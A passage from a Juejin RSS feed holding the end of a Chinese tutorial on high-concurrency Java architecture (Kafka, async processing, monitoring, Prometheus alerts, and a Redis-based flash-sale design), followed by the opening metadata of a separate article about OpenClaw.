<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ProducerFactory&lt;String, String&gt; <span class="hljs-title function_">producerFactory</span><span class="hljs-params">()</span> {
        Map&lt;String, Object&gt; configProps = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        configProps.put(
            ProducerConfig.BOOTSTRAP_SERVERS_CONFIG,
            <span class="hljs-string">"kafka1:9092,kafka2:9092,kafka3:9092"</span>
        );
        configProps.put(
            ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,
            StringSerializer.class
        );
        configProps.put(
            ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,
            StringSerializer.class
        );
        <span class="hljs-comment">// 高吞吐量配置</span>
        configProps.put(ProducerConfig.LINGER_MS_CONFIG, <span class="hljs-number">20</span>); <span class="hljs-comment">// 批量发送延迟</span>
        configProps.put(ProducerConfig.BATCH_SIZE_CONFIG, <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>); <span class="hljs-comment">// 批量大小</span>
        configProps.put(ProducerConfig.COMPRESSION_TYPE_CONFIG, <span class="hljs-string">"lz4"</span>); <span class="hljs-comment">// 压缩</span>
        
        <span class="hljs-comment">// 高可靠性配置</span>
        configProps.put(ProducerConfig.ACKS_CONFIG, <span class="hljs-string">"all"</span>); <span class="hljs-comment">// 所有副本确认</span>
        configProps.put(ProducerConfig.RETRIES_CONFIG, <span class="hljs-number">3</span>); <span class="hljs-comment">// 重试次数</span>
        configProps.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 幂等性</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultKafkaProducerFactory</span>&lt;&gt;(configProps);
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KafkaTemplate&lt;String, String&gt; <span class="hljs-title function_">kafkaTemplate</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaTemplate</span>&lt;&gt;(producerFactory());
    }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderMessageService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> KafkaTemplate&lt;String, String&gt; kafkaTemplate;
    
    <span class="hljs-comment">// 顺序消息发送</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendOrderEvent</span><span class="hljs-params">(OrderEvent event)</span> {
        <span class="hljs-comment">// 使用订单ID作为key，保证同一订单的消息顺序</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> String.valueOf(event.getOrderId());
        <span class="hljs-type">String</span> <span class="hljs-variable">topic</span> <span class="hljs-operator">=</span> <span class="hljs-string">"order-events"</span>;
        
        kafkaTemplate.send(topic, key, JsonUtils.toJson(event))
            .addCallback(
                result -&gt; log.info(<span class="hljs-string">"消息发送成功: {}"</span>, event),
                ex -&gt; {
                    log.error(<span class="hljs-string">"消息发送失败: {}"</span>, event, ex);
                    <span class="hljs-comment">// 失败处理：记录到数据库，定时重试</span>
                    saveFailedMessage(event, ex.getMessage());
                }
            );
    }
    
    <span class="hljs-comment">// 批量消息处理</span>
    <span class="hljs-meta">@KafkaListener(topics = "order-events", 
                   containerFactory = "batchFactory")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processOrderEvents</span><span class="hljs-params">(List&lt;ConsumerRecord&lt;String, String&gt;&gt; records)</span> {
        List&lt;OrderEvent&gt; events = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">OrderEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> JsonUtils.fromJson(record.value(), OrderEvent.class);
                events.add(event);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                log.error(<span class="hljs-string">"消息解析失败: {}"</span>, record.value(), e);
            }
        }
        
        <span class="hljs-keyword">if</span> (!events.isEmpty()) {
            <span class="hljs-comment">// 批量处理</span>
            batchProcessOrders(events);
        }
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; <span class="hljs-title function_">batchFactory</span><span class="hljs-params">()</span> {
        ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; factory =
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentKafkaListenerContainerFactory</span>&lt;&gt;();
        factory.setConsumerFactory(consumerFactory());
        factory.setBatchListener(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 开启批量监听</span>
        factory.getContainerProperties().setPollTimeout(<span class="hljs-number">3000</span>);
        <span class="hljs-keyword">return</span> factory;
    }
}
</code></pre>
<h3 data-id="heading-22">异步处理模式</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. CompletableFuture异步处理</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncOrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ThreadPoolTaskExecutor taskExecutor;
    
    <span class="hljs-keyword">public</span> CompletableFuture&lt;OrderResult&gt; <span class="hljs-title function_">createOrderAsync</span><span class="hljs-params">(OrderRequest request)</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 第一步：校验</span>
            validateOrder(request);
            
            <span class="hljs-keyword">return</span> request;
        }, taskExecutor).thenComposeAsync(validatedRequest -&gt; {
            <span class="hljs-comment">// 第二步：扣减库存</span>
            <span class="hljs-keyword">return</span> reduceInventoryAsync(validatedRequest);
        }, taskExecutor).thenComposeAsync(inventoryResult -&gt; {
            <span class="hljs-comment">// 第三步：生成订单</span>
            <span class="hljs-keyword">return</span> generateOrderAsync(inventoryResult);
        }, taskExecutor).thenApplyAsync(order -&gt; {
            <span class="hljs-comment">// 第四步：发送通知</span>
            sendNotification(order);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderResult</span>(order, <span class="hljs-string">"SUCCESS"</span>);
        }, taskExecutor).exceptionally(ex -&gt; {
            <span class="hljs-comment">// 异常处理</span>
            log.error(<span class="hljs-string">"订单创建失败"</span>, ex);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderResult</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">"FAILED: "</span> + ex.getMessage());
        });
    }
    
    <span class="hljs-comment">// 2. 事件驱动架构</span>
    <span class="hljs-meta">@Component</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventPublisher</span> {
        
        <span class="hljs-meta">@Autowired</span>
        <span class="hljs-keyword">private</span> ApplicationEventPublisher eventPublisher;
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
            <span class="hljs-comment">// 保存订单</span>
            orderRepository.save(order);
            
            <span class="hljs-comment">// 发布领域事件</span>
            eventPublisher.publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>(<span class="hljs-built_in">this</span>, order));
        }
    }
    
    <span class="hljs-meta">@Component</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {
        
        <span class="hljs-meta">@EventListener</span>
        <span class="hljs-meta">@Async</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreated</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> event.getOrder();
            
            <span class="hljs-comment">// 异步发送邮件</span>
            emailService.sendOrderConfirmation(order);
            
            <span class="hljs-comment">// 异步更新统计数据</span>
            statisticsService.updateOrderStats(order);
            
            <span class="hljs-comment">// 异步通知库存系统</span>
            inventoryService.notifyOrderCreated(order);
        }
    }
}
</code></pre>
<h2 data-id="heading-23">07 监控与治理：系统的眼睛和大脑</h2>
<p>没有监控的系统就像盲人开车。千万级系统需要完善的监控体系。</p>
<h3 data-id="heading-24">全链路监控</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 链路追踪（基于SkyWalking）</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TracingConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Tracer <span class="hljs-title function_">skywalkingTracer</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// SkyWalking自动注入，只需添加依赖</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkywalkingTracer</span>();
    }
}

<span class="hljs-comment">// 在业务代码中自动追踪</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
    
    <span class="hljs-meta">@Trace(operationName = "ProductService.getProduct")</span> <span class="hljs-comment">// SkyWalking注解</span>
    <span class="hljs-meta">@Tag(key = "productId", value = "arg[0]")</span> <span class="hljs-comment">// 添加标签</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-comment">// 业务逻辑</span>
        <span class="hljs-keyword">return</span> productRepository.findById(productId).orElse(<span class="hljs-literal">null</span>);
    }
}

<span class="hljs-comment">// 2. 指标监控（Micrometer + Prometheus）</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetricsConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MeterRegistry <span class="hljs-title function_">meterRegistry</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrometheusMeterRegistry</span>(PrometheusConfig.DEFAULT);
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> TimedAspect <span class="hljs-title function_">timedAspect</span><span class="hljs-params">(MeterRegistry registry)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TimedAspect</span>(registry);
    }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Counter orderCounter;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Timer orderTimer;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderService</span><span class="hljs-params">(MeterRegistry registry)</span> {
        orderCounter = Counter.builder(<span class="hljs-string">"orders.created"</span>)
            .description(<span class="hljs-string">"创建的订单数量"</span>)
            .tag(<span class="hljs-string">"type"</span>, <span class="hljs-string">"normal"</span>)
            .register(registry);
        
        orderTimer = Timer.builder(<span class="hljs-string">"orders.process.time"</span>)
            .description(<span class="hljs-string">"订单处理时间"</span>)
            .publishPercentiles(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.95</span>, <span class="hljs-number">0.99</span>) <span class="hljs-comment">// 50%, 95%, 99%分位数</span>
            .register(registry);
    }
    
    <span class="hljs-meta">@Timed(value = "orders.create", extraTags = {"priority", "high"})</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderRequest request)</span> {
        <span class="hljs-keyword">return</span> orderTimer.record(() -&gt; {
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> processOrder(request);
            orderCounter.increment();
            <span class="hljs-keyword">return</span> order;
        });
    }
}

<span class="hljs-comment">// 3. 健康检查</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomHealthIndicator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HealthIndicator</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> DataSource dataSource;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisConnectionFactory redisConnectionFactory;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Health <span class="hljs-title function_">health</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 检查数据库连接</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">dbHealthy</span> <span class="hljs-operator">=</span> checkDatabase();
        
        <span class="hljs-comment">// 检查Redis连接</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">redisHealthy</span> <span class="hljs-operator">=</span> checkRedis();
        
        <span class="hljs-comment">// 检查磁盘空间</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">diskHealthy</span> <span class="hljs-operator">=</span> checkDiskSpace();
        
        <span class="hljs-keyword">if</span> (dbHealthy &amp;&amp; redisHealthy &amp;&amp; diskHealthy) {
            <span class="hljs-keyword">return</span> Health.up()
                .withDetail(<span class="hljs-string">"database"</span>, <span class="hljs-string">"connected"</span>)
                .withDetail(<span class="hljs-string">"redis"</span>, <span class="hljs-string">"connected"</span>)
                .withDetail(<span class="hljs-string">"disk"</span>, <span class="hljs-string">"sufficient"</span>)
                .build();
        } <span class="hljs-keyword">else</span> {
            Map&lt;String, Object&gt; details = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            details.put(<span class="hljs-string">"database"</span>, dbHealthy ? <span class="hljs-string">"connected"</span> : <span class="hljs-string">"disconnected"</span>);
            details.put(<span class="hljs-string">"redis"</span>, redisHealthy ? <span class="hljs-string">"connected"</span> : <span class="hljs-string">"disconnected"</span>);
            details.put(<span class="hljs-string">"disk"</span>, diskHealthy ? <span class="hljs-string">"sufficient"</span> : <span class="hljs-string">"insufficient"</span>);
            
            <span class="hljs-keyword">return</span> Health.down().withDetails(details).build();
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkDatabase</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> dataSource.getConnection().isValid(<span class="hljs-number">5</span>);
        } <span class="hljs-keyword">catch</span> (SQLException e) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-25">智能告警</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Prometheus告警规则</span>
<span class="hljs-attr">groups:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">application_alerts</span>
    <span class="hljs-attr">rules:</span>
      <span class="hljs-comment"># 错误率告警</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">HighErrorRate</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">rate(http_requests_total{status=~"5.."}[5m])</span> <span class="hljs-string">/</span> <span class="hljs-string">rate(http_requests_total[5m])</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">0.01</span>
        <span class="hljs-attr">for:</span> <span class="hljs-string">2m</span>
        <span class="hljs-attr">labels:</span>
          <span class="hljs-attr">severity:</span> <span class="hljs-string">critical</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"高错误率告警"</span>
          <span class="hljs-attr">description:</span> <span class="hljs-string">"错误率超过1% (当前值: <span class="hljs-template-variable">{{ $value }}</span>)"</span>
      
      <span class="hljs-comment"># 延迟告警</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">HighLatency</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">histogram_quantile(0.95,</span> <span class="hljs-string">rate(http_request_duration_seconds_bucket[5m]))</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">1</span>
        <span class="hljs-attr">for:</span> <span class="hljs-string">5m</span>
        <span class="hljs-attr">labels:</span>
          <span class="hljs-attr">severity:</span> <span class="hljs-string">warning</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"高延迟告警"</span>
          <span class="hljs-attr">description:</span> <span class="hljs-string">"95分位延迟超过1秒 (当前值: <span class="hljs-template-variable">{{ $value }}</span>s)"</span>
      
      <span class="hljs-comment"># 服务宕机告警</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">ServiceDown</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">up</span> <span class="hljs-string">==</span> <span class="hljs-number">0</span>
        <span class="hljs-attr">for:</span> <span class="hljs-string">1m</span>
        <span class="hljs-attr">labels:</span>
          <span class="hljs-attr">severity:</span> <span class="hljs-string">critical</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"服务宕机告警"</span>
          <span class="hljs-attr">description:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{ $labels.job }}</span> 服务已宕机"</span>
</code></pre>
<h2 data-id="heading-26">08 实战案例：秒杀系统设计</h2>
<p>让我们用一个具体的例子来综合运用上述技术。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SeckillService</span> {
    
    <span class="hljs-comment">// 1. 缓存预热</span>
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">warmUpCache</span><span class="hljs-params">()</span> {
        List&lt;SeckillProduct&gt; hotProducts = findHotProducts();
        
        hotProducts.parallelStream().forEach(product -&gt; {
            <span class="hljs-type">String</span> <span class="hljs-variable">stockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:stock:"</span> + product.getId();
            redisTemplate.opsForValue().set(stockKey, product.getStock());
            
            <span class="hljs-comment">// 设置随机过期时间，防止雪崩</span>
            setWithRandomExpire(stockKey, product.getStock(), <span class="hljs-number">10</span>, TimeUnit.MINUTES);
        });
    }
    
    <span class="hljs-comment">// 2. 秒杀入口（防刷+限流）</span>
    <span class="hljs-meta">@RateLimiter(key = "'seckill:' + #userId", 
                 limit = 1, period = 10, unit = TimeUnit.SECONDS)</span>
    <span class="hljs-keyword">public</span> SeckillResult <span class="hljs-title function_">seckill</span><span class="hljs-params">(Long userId, Long productId)</span> {
        <span class="hljs-comment">// 2.1 资格校验（Redis实现）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">userKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:user:"</span> + productId + <span class="hljs-string">":"</span> + userId;
        <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(redisTemplate.hasKey(userKey))) {
            <span class="hljs-keyword">return</span> SeckillResult.alreadyParticipated();
        }
        
        <span class="hljs-comment">// 2.2 库存预扣减（Lua脚本保证原子性）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">stockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:stock:"</span> + productId;
        <span class="hljs-type">Long</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> redisTemplate.execute(
            stockDecrScript, 
            Collections.singletonList(stockKey), 
            <span class="hljs-string">"1"</span>
        );
        
        <span class="hljs-keyword">if</span> (remaining &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 库存不足，回滚</span>
            redisTemplate.opsForValue().increment(stockKey, <span class="hljs-number">1</span>);
            <span class="hljs-keyword">return</span> SeckillResult.outOfStock();
        }
        
        <span class="hljs-comment">// 2.3 记录用户购买资格</span>
        redisTemplate.opsForValue().set(userKey, <span class="hljs-string">"1"</span>, <span class="hljs-number">1</span>, TimeUnit.HOURS);
        
        <span class="hljs-comment">// 2.4 发送消息到队列，异步创建订单</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">orderKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:order:"</span> + UUID.randomUUID();
        <span class="hljs-type">SeckillOrderMessage</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SeckillOrderMessage</span>(userId, productId, orderKey);
        
        kafkaTemplate.send(<span class="hljs-string">"seckill-orders"</span>, 
            String.valueOf(productId), 
            JsonUtils.toJson(message)
        );
        
        <span class="hljs-keyword">return</span> SeckillResult.success(orderKey);
    }
    
    <span class="hljs-comment">// 3. 异步订单处理</span>
    <span class="hljs-meta">@KafkaListener(topics = "seckill-orders", 
                   groupId = "seckill-order-processor")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSeckillOrder</span><span class="hljs-params">(String message)</span> {
        <span class="hljs-type">SeckillOrderMessage</span> <span class="hljs-variable">orderMessage</span> <span class="hljs-operator">=</span> JsonUtils.fromJson(message, SeckillOrderMessage.class);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 3.1 创建订单（数据库操作）</span>
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> createOrderInDB(orderMessage);
            
            <span class="hljs-comment">// 3.2 更新缓存状态</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">resultKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:result:"</span> + orderMessage.getOrderKey();
            redisTemplate.opsForValue().set(resultKey, order.getId(), <span class="hljs-number">10</span>, TimeUnit.MINUTES);
            
            <span class="hljs-comment">// 3.3 发送成功通知</span>
            notifyUser(orderMessage.getUserId(), order);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"处理秒杀订单失败"</span>, e);
            
            <span class="hljs-comment">// 失败处理：恢复库存</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">stockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:stock:"</span> + orderMessage.getProductId();
            redisTemplate.opsForValue().increment(stockKey, <span class="hljs-number">1</span>);
            
            <span class="hljs-comment">// 移除用户资格记录</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">userKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:user:"</span> + orderMessage.getProductId() + <span class="hljs-string">":"</span> + orderMessage.getUserId();
            redisTemplate.delete(userKey);
        }
    }
    
    <span class="hljs-comment">// 4. 库存扣减Lua脚本</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DefaultRedisScript&lt;Long&gt; stockDecrScript = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;(
        <span class="hljs-string">"local key = KEYS[1]\n"</span> +
        <span class="hljs-string">"local decrement = tonumber(ARGV[1])\n"</span> +
        <span class="hljs-string">"local current = redis.call('get', key)\n"</span> +
        <span class="hljs-string">"if not current then\n"</span> +
        <span class="hljs-string">"    return -1\n"</span> +
        <span class="hljs-string">"end\n"</span> +
        <span class="hljs-string">"local currentNum = tonumber(current)\n"</span> +
        <span class="hljs-string">"if currentNum &lt; decrement then\n"</span> +
        <span class="hljs-string">"    return -1\n"</span> +
        <span class="hljs-string">"end\n"</span> +
        <span class="hljs-string">"return redis.call('decrby', key, decrement)"</span>,
        Long.class
    );
}
</code></pre>
<p>更多项目实战：<a href="https://link.juejin.cn?target=http%3A%2F%2Fsusan.net.cn%2Fproject" target="_blank" title="http://susan.net.cn/project" ref="nofollow noopener noreferrer">java突击队</a></p>
<h2 data-id="heading-27">总结</h2>
<p>设计一个扛住千万级流量的系统，不是简单堆砌技术组件，而是<strong>构建一个有机的、能自我调节的生态系统</strong>。</p>
<p>通过本文的分享，我想你已经看到了一个完整的高并发系统架构图景。</p>
<p>让我最后总结一下关键点：</p>
<ol>
<li>
<p><strong>架构是演进而来的</strong>：不要一开始就追求完美架构，而是随着业务增长不断演进。从小而美的单体开始，逐步拆分、优化、扩展。</p>
</li>
<li>
<p><strong>缓存是性能的银弹</strong>：但要用得聪明。多级缓存、智能淘汰、防止穿透/击穿/雪崩，每个细节都影响巨大。</p>
</li>
<li>
<p><strong>数据库是瓶颈所在</strong>：读写分离、分库分表、索引优化、SQL调优，这些基本功比任何炫酷的技术都重要。</p>
</li>
<li>
<p><strong>异步是扩展的关键</strong>：能异步的绝不同步，能批处理的绝不单条。消息队列、事件驱动、反应式编程，让系统松耦合、高内聚。</p>
</li>
<li>
<p><strong>监控是系统的眼睛</strong>：没有监控的系统就是在裸奔。全链路追踪、指标监控、日志聚合、智能告警，缺一不可。</p>
</li>
<li>
<p><strong>容错比优化更重要</strong>：系统一定会出问题，关键是如何快速发现、快速恢复、快速止损。熔断、降级、限流、重试，这些机制是系统的保险绳。</p>
</li>
</ol>
<p>真正的架构大师，不是掌握了多少技术框架，而是能在业务需求、技术实现、团队能力、资源约束之间找到最佳平衡点。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一文读懂OpenClaw核心特性与原理解析(文末附国产大模型+聊天软件接入OpenClaw视频教程地址)]]></title>    <link>https://juejin.cn/post/7602466689713078287</link>    <guid>https://juejin.cn/post/7602466689713078287</guid>    <pubDate>2026-02-04T02:55:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602466689713078287" data-draft-id="7602106969698566207" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一文读懂OpenClaw核心特性与原理解析(文末附国产大模型+聊天软件接入OpenClaw视频教程地址)"/> <meta itemprop="keywords" content="人工智能,LangChain,Agent"/> <meta itemprop="datePublished" content="2026-02-04T02:55:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型真好玩"/> <meta itemprop="url" content="https://juejin.cn/user/3140624091453053"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一文读懂OpenClaw核心特性与原理解析(文末附国产大模型+聊天软件接入OpenClaw视频教程地址)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3140624091453053/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型真好玩
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:55:08.000Z" title="Wed Feb 04 2026 02:55:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
